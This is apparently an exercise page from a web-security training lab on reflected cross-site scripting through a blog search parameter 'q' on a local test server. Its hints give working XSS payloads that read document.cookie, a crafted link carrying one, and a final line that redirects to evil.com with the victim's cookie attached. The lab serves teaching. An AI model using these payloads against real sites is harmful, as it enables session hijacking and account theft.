Exercise 1 continued

You have successfully searched for a blog post! It does not matter if your search yielded results, what matters is that you gained information about the search request! Specifically, there are two pieces of information you need to test the vulnerability of this search request. Think about the user input and how it can be used to run a script. Craft a malicious script to obtain the website's cookie. Don't forget to copy it for submission on the main page!


Hints

You can read from the URL that it contains a single query parameter called 'q', which is used to search the blog posts. Furthermore, you can see that the query value is rendered onto the web page. Lastly, the presence of a parameter in the URL string reveals that a GET request is used, which is less secure than the POST request. Read more about them here!

In order to load and run JavaScript in a browser, you have to wrap the code in: 

<script> Here you can define your JavaScript code </script>

In order to access the website's cookie, you can use the JavaScript method document.cookie. You can try this out manually by "Inspecting" the website and typing document.cookie into the console.

The easiest and most straightforward ways of obtaining or displaying any value from a website using JavaScript methods would be either by displaying an alert 

alert(somevalue);

or by logging the value into the console

console.log(somevalue);

This is one way of obtaining a cookie from website: 

<script>alert(document.cookie);</script>

...and this is how a link you could send someone could look like: 

http://127.0.0.1:8000/xss_app/search/?q=<script>alert(document.cookie);</script>

Displaying the victim's cookie to themselves is not very useful for the attacker. In a more realistic scenario, the attacker could, for example, send the value of the cookie to their malicious website as a parameter. 

<script>window.location.replace("http://evil.com/?c=" + document.cookie)</script>
